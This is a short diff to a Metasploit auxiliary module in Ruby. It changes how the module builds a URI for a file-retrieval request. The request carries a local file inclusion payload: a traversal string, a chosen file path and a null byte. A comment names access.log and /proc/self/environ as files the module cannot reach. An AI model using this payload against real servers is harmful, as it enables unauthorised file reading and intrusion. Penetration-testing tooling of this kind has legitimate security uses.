@@ -52,9 +52,10 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Retrieving #{datastore['FILE']}")
 
 		# No permission to access.log or proc/self/environ, so this is all we do :-/
+		uri = normalize_uri(uri, 'index.php')
 		res = send_request_raw({
 			'method' => 'GET',
-			'uri'    => "#{uri}index.php/?p=#{t}#{datastore['FILE']}%00"
+			'uri'    => "#{uri}/?p=#{t}#{datastore['FILE']}%00"
 		})
 
 		if not res
